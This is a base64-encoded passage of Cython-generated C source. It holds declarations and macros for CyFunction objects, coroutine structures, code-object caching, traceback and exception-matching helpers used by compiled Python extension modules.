m9tKFB5T2JqZWN0KiBtb2R1bGUsIFB5T2JqZWN0KiBuYW1lKTsKCgojZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfTXVsdGlwbHlfTGVmdChtdWwsIHNlcSkgIF9fUHl4X1B5U2VxdWVuY2VfTXVsdGlwbHkoc2VxLCBtdWwpCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVNlcXVlbmNlX011bHRpcGx5KFB5T2JqZWN0ICpzZXEsIFB5X3NzaXplX3QgbXVsKTsKCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ZldGNoU2hhcmVkQ3l0aG9uQUJJTW9kdWxlKHZvaWQpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeURpY3RfU2V0RGVmYXVsdChQeU9iamVjdCAqZCwgUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKmRlZmF1bHRfdmFsdWUsIGludCBpc19zYWZlX3R5cGUpOwoKCnN0YXRpYyBQeVR5cGVPYmplY3QqIF9fUHl4X0ZldGNoQ29tbW9uVHlwZUZyb21TcGVjKFB5VHlwZU9iamVjdCAqbWV0YWNsYXNzLCBQeU9iamVjdCAqbW9kdWxlLCBQeVR5cGVfU3BlYyAqc3BlYywgUHlPYmplY3QgKmJhc2VzKTsKCgpzdGF0aWMgaW50IF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2luaXQoUHlPYmplY3QgKm1vZHVsZSk7CiNkZWZpbmUgX19QeXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfVVNFRAoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlNZXRob2RfTmV3KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCk7CgoKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIChDWVRIT05fVkVDVE9SQ0FMTCB8fCBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTCkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZjLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3KTsKI2VuZGlmCgoKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX1VTRUQKI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCAgMHgwMQojZGVmaW5lIF9fUHl4X0NZRlVOQ1RJT05fQ0xBU1NNRVRIT0QgICAweDAyCiNkZWZpbmUgX19QeXhfQ1lGVU5DVElPTl9DQ0xBU1MgICAgICAgIDB4MDQKI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NPUk9VVElORSAgICAgMHgwOAojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xvc3VyZShmKVwKICAgICgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZnVuY19jbG9zdXJlKQojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZilcCiAgICAgICgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZnVuY19jbGFzc29iaikKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZilcCiAgICAgICgoUHlPYmplY3QqKSAoKFB5Q01ldGhvZE9iamVjdCAqKSAoZikpLT5tbV9jbGFzcykKI2VuZGlmCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9TZXRDbGFzc09iaihmLCBjbGFzc29iailcCiAgICBfX1B5eF9fQ3lGdW5jdGlvbl9TZXRDbGFzc09iaigoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZiksIChjbGFzc29iaikpCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9EZWZhdWx0cyh0eXBlLCBmKVwKICAgICgodHlwZSAqKSgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZGVmYXVsdHMpKQojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNHZXR0ZXIoZiwgZylcCiAgICAoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZGVmYXVsdHNfZ2V0dGVyID0gKGcpCnR5cGVkZWYgc3RydWN0IHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5T2JqZWN0X0hFQUQKICAgIFB5T2JqZWN0ICpmdW5jOwojZWxpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEKICAgIFB5Q0Z1bmN0aW9uT2JqZWN0IGZ1bmM7CiNlbHNlCiAgICBQeUNNZXRob2RPYmplY3QgZnVuYzsKI2VuZGlmCiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTCB8fFwKICAgICAgICAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBDWVRIT05fTUVUSF9GQVNUQ0FMTCkKICAgIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIGZ1bmNfdmVjdG9yY2FsbDsKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdCAqZnVuY193ZWFrcmVmbGlzdDsKI2VuZGlmCiAgICBQeU9iamVjdCAqZnVuY19kaWN0OwogICAgUHlPYmplY3QgKmZ1bmNfbmFtZTsKICAgIFB5T2JqZWN0ICpmdW5jX3F1YWxuYW1lOwogICAgUHlPYmplY3QgKmZ1bmNfZG9jOwogICAgUHlPYmplY3QgKmZ1bmNfZ2xvYmFsczsKICAgIFB5T2JqZWN0ICpmdW5jX2NvZGU7CiAgICBQeU9iamVjdCAqZnVuY19jbG9zdXJlOwojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5T2JqZWN0ICpmdW5jX2NsYXNzb2JqOwojZW5kaWYKICAgIFB5T2JqZWN0ICpkZWZhdWx0czsKICAgIGludCBmbGFnczsKICAgIFB5T2JqZWN0ICpkZWZhdWx0c190dXBsZTsKICAgIFB5T2JqZWN0ICpkZWZhdWx0c19rd2RpY3Q7CiAgICBQeU9iamVjdCAqKCpkZWZhdWx0c19nZXR0ZXIpKFB5T2JqZWN0ICopOwogICAgUHlPYmplY3QgKmZ1bmNfYW5ub3RhdGlvbnM7CiAgICBQeU9iamVjdCAqZnVuY19pc19jb3JvdXRpbmU7Cn0gX19weXhfQ3lGdW5jdGlvbk9iamVjdDsKI3VuZGVmIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjawojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2sob2JqKSAgX19QeXhfVHlwZUNoZWNrKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfQ3lGdW5jdGlvblR5cGUpCiNkZWZpbmUgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0NoZWNrKG9iaikgIF9fUHl4X1R5cGVDaGVjazIob2JqLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSwgJlB5Q0Z1bmN0aW9uX1R5cGUpCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9DaGVja0V4YWN0KG9iaikgIF9fUHl4X0lTX1RZUEUob2JqLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSkKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKTsKI3VuZGVmIF9fUHl4X0lzU2FtZUNGdW5jdGlvbgojZGVmaW5lIF9fUHl4X0lzU2FtZUNGdW5jdGlvbihmdW5jLCBjZnVuYykgICBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihmdW5jLCBjZnVuYykKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCogb3AsIFB5TWV0aG9kRGVmICptbCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgZmxhZ3MsIFB5T2JqZWN0KiBxdWFsbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqbW9kdWxlLCBQeU9iamVjdCAqZ2xvYmFscywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCogY29kZSk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooX19weXhfQ3lGdW5jdGlvbk9iamVjdCogZiwgUHlPYmplY3QqIGNsYXNzb2JqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fSW5pdERlZmF1bHRzKFB5T2JqZWN0ICpmdW5jLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeVR5cGVPYmplY3QgKmRlZmF1bHRzX3R5cGUpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNUdXBsZShQeU9iamVjdCAqbSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKnR1cGxlKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzS3dEaWN0KFB5T2JqZWN0ICptLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRpY3QpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0QW5ub3RhdGlvbnNEaWN0KFB5T2JqZWN0ICptLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpkaWN0KTsKc3RhdGljIGludCBfX3B5eF9DeUZ1bmN0aW9uX2luaXQoUHlPYmplY3QgKm1vZHVsZSk7CiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTk9BUkdTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKTsKc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX08oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpOwpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFMoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpOwpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFNfTUVUSE9EKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKTsKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChmKSAoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmKS0+ZnVuY192ZWN0b3JjYWxsKQojZWxzZQojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGYpICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmKS0+dmVjdG9yY2FsbCkKI2VuZGlmCiNlbmRpZgoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9OZXcoUHlNZXRob2REZWYgKm1sLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjbG9zdXJlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0ICpnbG9iYWxzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0KiBjb2RlKTsKCgojaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAmJiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLX1JVTlRJTUUKc3RhdGljIGludCBfX1B5eF9DTGluZUZvclRyYWNlYmFjayhQeVRocmVhZFN0YXRlICp0c3RhdGUsIGludCBjX2xpbmUpOwojZWxzZQojZGVmaW5lIF9fUHl4X0NMaW5lRm9yVHJhY2ViYWNrKHRzdGF0ZSwgY19saW5lKSAgKCgoQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSykpID8gY19saW5lIDogMCkKI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKdHlwZWRlZiBQeU9iamVjdCBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZTsKI2Vsc2UKdHlwZWRlZiBQeUNvZGVPYmplY3QgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGU7CiNlbmRpZgp0eXBlZGVmIHN0cnVjdCB7CiAgICBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3Q7CiAgICBpbnQgY29kZV9saW5lOwp9IF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5OwpzdHJ1Y3QgX19QeXhfQ29kZU9iamVjdENhY2hlIHsKICAgIGludCBjb3VudDsKICAgIGludCBtYXhfY291bnQ7CiAgICBfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSogZW50cmllczsKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKICAgIF9fcHl4X2F0b21pY19pbnRfdHlwZSBhY2Nlc3Nvcl9jb3VudDsKICAjZW5kaWYKfTsKc3RhdGljIGludCBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzLCBpbnQgY291bnQsIGludCBjb2RlX2xpbmUpOwpzdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X2ZpbmRfY29kZV9vYmplY3QoaW50IGNvZGVfbGluZSk7CnN0YXRpYyB2b2lkIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChpbnQgY29kZV9saW5lLCBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3QpOwoKCnN0YXRpYyB2b2lkIF9fUHl4X0FkZFRyYWNlYmFjayhjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSk7CgoKI2lmICFkZWZpbmVkKF9fSU5URUxfQ09NUElMRVIpICYmIGRlZmluZWQoX19HTlVDX18pICYmIChfX0dOVUNfXyA+IDQgfHwgKF9fR05VQ19fID09IDQgJiYgX19HTlVDX01JTk9SX18gPj0gNikpCiNkZWZpbmUgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeUxvbmdfRnJvbV9sb25nKGxvbmcgdmFsdWUpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGxvbmcgX19QeXhfUHlMb25nX0FzX2xvbmcoUHlPYmplY3QgKik7CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKdHlwZWRlZiBQeU9iamVjdCAqX19QeXhfVHlwZU5hbWU7CiNkZWZpbmUgX19QeXhfRk1UX1RZUEVOQU1FICIlVSIKI2RlZmluZSBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqKSBQeV9YREVDUkVGKG9iaikKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAojZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUgUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZQojZWxzZQpzdGF0aWMgX19QeXhfVHlwZU5hbWUgX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeVR5cGVPYmplY3QqIHRwKTsKI2VuZGlmCiNlbHNlICAvLyAhTElNSVRFRF9BUEkKdHlwZWRlZiBjb25zdCBjaGFyICpfX1B5eF9UeXBlTmFtZTsKI2RlZmluZSBfX1B5eF9GTVRfVFlQRU5BTUUgIiUuMjAwcyIKI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKHRwKSAoKHRwKS0+dHBfbmFtZSkKI2RlZmluZSBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqKQojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0FzX2ludChQeU9iamVjdCAqKTsKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrKG9iaiwgdHlwZSkgX19QeXhfSXNTdWJ0eXBlKFB5X1RZUEUob2JqKSwgKFB5VHlwZU9iamVjdCAqKXR5cGUpCiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrMihvYmosIHR5cGUxLCB0eXBlMikgX19QeXhfSXNBbnlTdWJ0eXBlMihQeV9UWVBFKG9iaiksIChQeVR5cGVPYmplY3QgKil0eXBlMSwgKFB5VHlwZU9iamVjdCAqKXR5cGUyKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXNTdWJ0eXBlKFB5VHlwZU9iamVjdCAqYSwgUHlUeXBlT2JqZWN0ICpiKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzQW55U3VidHlwZTIoUHlUeXBlT2JqZWN0ICpjbHMsIFB5VHlwZU9iamVjdCAqYSwgUHlUeXBlT2JqZWN0ICpiKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhQeU9iamVjdCAqZXJyLCBQeU9iamVjdCAqdHlwZSk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICp0eXBlMSwgUHlPYmplY3QgKnR5cGUyKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2sob2JqLCB0eXBlKSBQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAoUHlUeXBlT2JqZWN0ICopdHlwZSkKI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2syKG9iaiwgdHlwZTEsIHR5cGUyKSAoUHlPYmplY3RfVHlwZUNoZWNrKG9iaiwgKFB5VHlwZU9iamVjdCAqKXR5cGUxKSB8fCBQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAoUHlUeXBlT2JqZWN0ICopdHlwZTIpKQojZGVmaW5lIF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIHR5cGUpIFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIHR5cGUpCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICp0eXBlMSwgUHlPYmplY3QgKnR5cGUyKSB7CiAgICByZXR1cm4gUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZTEpIHx8IFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIHR5cGUyKTsKfQojZW5kaWYKI2RlZmluZSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzMihlcnIxLCBlcnIyKSAgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpLCBlcnIxLCBlcnIyKQojZGVmaW5lIF9fUHl4X1B5RXhjZXB0aW9uX0NoZWNrKG9iaikgX19QeXhfVHlwZUNoZWNrKG9iaiwgUHlFeGNfRXhjZXB0aW9uKQojaWZkZWYgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjawogICNkZWZpbmUgX19QeXhfUHlCYXNlRXhjZXB0aW9uX0NoZWNrKG9iaikgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayhvYmopCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeUJhc2VFeGNlcHRpb25fQ2hlY2sob2JqKSBfX1B5eF9UeXBlQ2hlY2sob2JqLCBQeUV4Y19CYXNlRXhjZXB0aW9uKQojZW5kaWYKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZShQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIsIFB5T2JqZWN0ICpjYXVzZSk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5SXRlcl9OZXh0X1BsYWluKFB5T2JqZWN0ICppdGVyYXRvcik7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSSh2b2lkKTsKI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYywgaW50IGl0ZXJuZXh0KTsKCgpzdHJ1Y3QgX19weXhfQ29yb3V0aW5lT2JqZWN0Owp0eXBlZGVmIFB5T2JqZWN0ICooKl9fcHl4X2Nvcm91dGluZV9ib2R5X3QpKHN0cnVjdCBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKiwgUHlUaHJlYWRTdGF0ZSAqLCBQeU9iamVjdCAqKTsKI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKI2RlZmluZSBfX1B5eF9FeGNJbmZvU3RydWN0ICBfUHlFcnJfU3RhY2tJdGVtCiNlbHNlCnR5cGVkZWYgc3RydWN0IHsKICAgIFB5T2JqZWN0ICpleGNfdHlwZTsKICAgIFB5T2JqZWN0ICpleGNfdmFsdWU7CiAgICBQeU9iamVjdCAqZXhjX3RyYWNlYmFjazsKfSBfX1B5eF9FeGNJbmZvU3RydWN0OwojZW5kaWYKdHlwZWRlZiBzdHJ1Y3QgX19weXhfQ29yb3V0aW5lT2JqZWN0IHsKICAgIFB5T2JqZWN0X0hFQUQKICAgIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keTsKICAgIFB5T2JqZWN0ICpjbG9zdXJlOwogICAgX19QeXhfRXhjSW5mb1N0cnVjdCBnaV9leGNfc3RhdGU7CiAgICBQeU9iamVjdCAqZ2lfd2Vha3JlZmxpc3Q7CiAgICBQeU9iamVjdCAqY2xhc3NvYmo7CiAgICBQeU9iamVjdCAqeWllbGRmcm9tOwogICAgX19QeXhfcHlpdGVyX3NlbmRmdW5jIHlpZWxkZnJvbV9hbV9zZW5kOwogICAgUHlPYmplY3QgKmdpX25hbWU7CiAgICBQeU9iamVjdCAqZ2lfcXVhbG5hbWU7CiAgICBQeU9iamVjdCAqZ2lfbW9kdWxlbmFtZTsKICAgIFB5T2JqZWN0ICpnaV9jb2RlOwogICAgUHlPYmplY3QgKmdpX2ZyYW1lOwojaWYgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklORyAmJiAoQ1lUSE9OX1BST0ZJTEUgfHwgQ1lUSE9OX1RSQUNFKQogICAgUHlNb25pdG9yaW5nU3RhdGUgX19weXhfcHltb25pdG9yaW5nX3N0YXRlW19fUHl4X01vbml0b3JpbmdFdmVudFR5cGVzX0N5R2VuX2NvdW50XTsKICAgIHVpbnQ2NF90IF9fcHl4X3B5bW9uaXRvcmluZ192ZXJzaW9uOwojZW5kaWYKICAgIGludCByZXN1bWVfbGFiZWw7CiAgICBjaGFyIGlzX3J1bm5pbmc7Cn0gX19weXhfQ29yb3V0aW5lT2JqZWN0OwpzdGF0aWMgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX05ldygKICAgIFB5VHlwZU9iamVjdCAqdHlwZSwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsCiAgICBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnF1YWxuYW1lLCBQeU9iamVjdCAqbW9kdWxlX25hbWUpOwpzdGF0aWMgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX05ld0luaXQoCiAgICAgICAgICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCBfX3B5eF9jb3JvdXRpbmVfYm9keV90IGJvZHksIFB5T2JqZWN0ICpjb2RlLCBQeU9iamVjdCAqY2xvc3VyZSwKICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqc2VsZik7CnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX2NsZWFyKFB5T2JqZWN0ICpzZWxmKTsKc3RhdGljIF9fUHl4X1B5U2VuZFJlc3VsdCBfX1B5eF9Db3JvdXRpbmVfQW1TZW5kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICoqcmV0dmFsKTsKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlKTsKc3RhdGljIF9fUHl4X1B5U2VuZFJlc3VsdCBfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICoqcmV0dmFsKTsKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfVGhyb3coUHlPYmplY3QgKmdlbiwgUHlPYmplY3QgKmFyZ3MpOwojaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwojZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9Td2FwRXhjZXB0aW9uKHNlbGYpCiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX1Jlc2V0QW5kQ2xlYXJFeGNlcHRpb24oc2VsZikgIF9fUHl4X0Nvcm91dGluZV9FeGNlcHRpb25DbGVhcigmKHNlbGYpLT5naV9leGNfc3RhdGUpCiNlbHNlCiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX1N3YXBFeGNlcHRpb24oc2VsZikge1wKICAgIF9fUHl4X0V4Y2VwdGlvblN3YXAoJihzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlLCAmKHNlbG